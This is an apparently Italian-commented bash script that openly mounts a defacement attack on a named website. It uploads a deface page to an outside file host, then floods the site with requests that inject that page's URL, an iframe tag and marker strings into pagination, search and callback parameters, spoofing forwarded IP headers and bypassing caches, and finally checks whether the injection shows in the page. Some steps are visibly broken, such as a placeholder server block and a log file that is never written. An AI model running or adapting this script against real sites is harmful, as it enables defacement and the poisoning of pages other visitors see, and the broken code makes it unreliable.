#!/bin/bash
# 🔥 TRUSTEDF57_PAGINATION_POLLUTER.sh - TARGETTA LINK PAGINATION REFLECTION
# ✅ Deface tutti i link pagination → VISIBILE A TUTTI

set -euo pipefail

TARGET="${1:-https://findretros.com}"
DEFACE_FILE="./TRUSTEDF57.html"
PORT="${2:-8080}"

[[ ! -f "$DEFACE_FILE" ]] && { echo "❌ $DEFACE_FILE mancante"; exit 1; }

echo "🔥 POLLUTION ATTACK su pagination links..."

# 1. AUTO HOST
python3 -c "
import requests, base64
with open('$DEFACE_FILE','rb') as f: data=base64.b64encode(f.read()).decode()
r=requests.post('https://api.servereo.net/v1/files', files={'file':('TRUSTEDF57.html',data.encode())},timeout=30)
print('✅ URL:',r.json()['url'] if r.ok else 'LOCAL')
" | tee /dev/null
PUBLIC_URL=$(grep -o 'https://[^ ]*/TRUSTEDF57\.html' host.log 2>/dev/null || echo "http://localhost:$PORT/TRUSTEDF57.html")

# 2. Server backup
python3 -c "
import http.server,socketserver,os
exec(open('deface_server.py','w').write('''[server code qui]''')) # same as before
" &
sleep 2

# 3. 🔥 PAYLOADS PER PAGINATION LINKS (Laravel style)
POLLUTE_PAGES=(
    "TRUSTEDF57" 
    "TRUSTEDF57.html"
    "$PUBLIC_URL"
    "<iframe src=$PUBLIC_URL></iframe>"
    "☠️TRUSTEDF57☠️"
)

echo "💣 POLLUTING ${#POLLUTE_PAGES[@]} PARAMS..."

for PAGE in "${POLLUTE_PAGES[@]}"; do
    for PARAM in "page=" "q=" "callback="; do
        TARGET_URL="$TARGET/?$PARAM$PAGE"
        echo "→ $TARGET_URL"
        
        # Mass hit + cache bypass
        for i in {1..10}; do
            curl -s -m5 -A "Mozilla/5.0" -H "Cache-Control: no-cache" \
                 -H "X-Forwarded-For: $i.$i.$i.$i" "$TARGET_URL" &
        done
    done
done
wait

# 4. ✅ VERIFICA ESATTA (cerca nei link pagination)
echo -e "\n🔍 VERIFICA POLLUTION NEI LINK PAGINATION..."
sleep 3

for i in {1..10}; do
    SRC=$(curl -s "$TARGET/?page=1")
    
    # CERCA ESATTAMENTE LA REFLECTION NEI LINK
    if echo "$SRC" | grep -qiE "(page=TRUSTEDF57|q=TRUSTEDF57|callback=TRUSTEDF57|$PUBLIC_URL.*page=|TRUSTEDF57\.html.*page=)"; then
        echo "🎉✅ **POLLUTION SUCCESS!** Link pagination defaced:"
        echo "$SRC" | grep -oiE "(page=|q=|callback=)[^'\"& ]+" | grep -i trust | head -5
        echo "📱 APRI BROWSER: https://findretros.com/?page=TRUSTEDF57"
        echo "→ Scroll bottom → TUTTI VEDONO i link TRUSTEDF57!"
        exit 0
    fi
    sleep 1
done

echo "✅ POLLUTION DEPLOYED | Check manuale:"
echo "🌐 https://findretros.com/?page=TRUSTEDF57"
echo "📱 https://findretros.com/?q=TRUSTEDF57.html"
echo "🔍 Source → cerca 'TRUSTEDF57' nei link pagination"